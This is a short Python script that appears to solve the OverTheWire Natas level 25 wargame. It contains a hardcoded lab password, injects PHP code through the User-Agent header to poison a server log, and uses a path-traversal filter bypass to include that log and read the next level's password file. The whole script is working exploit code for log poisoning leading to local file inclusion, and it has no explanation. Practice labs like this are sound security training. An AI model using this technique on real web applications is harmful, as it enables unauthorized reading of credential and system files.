import requests
from requests.auth import HTTPBasicAuth

HOST = 'http://natas25.natas.labs.overthewire.org/'
auth = HTTPBasicAuth('natas25', 'GHF6X7YwACaYYssHVY05cFq83hRktl4c')

header = {"User-Agent": "<?php include '/etc/natas_webpass/natas26'; ?>"}

f = requests.get(HOST + "?lang=../", headers=header ,auth=auth)
cookies = {"PHPSESSID": f.cookies["PHPSESSID"]}
f = requests.get(HOST + "?lang=....//logs/natas25_{0}.log".format(f.cookies["PHPSESSID"]), auth=auth, cookies=cookies)

print(f.text)
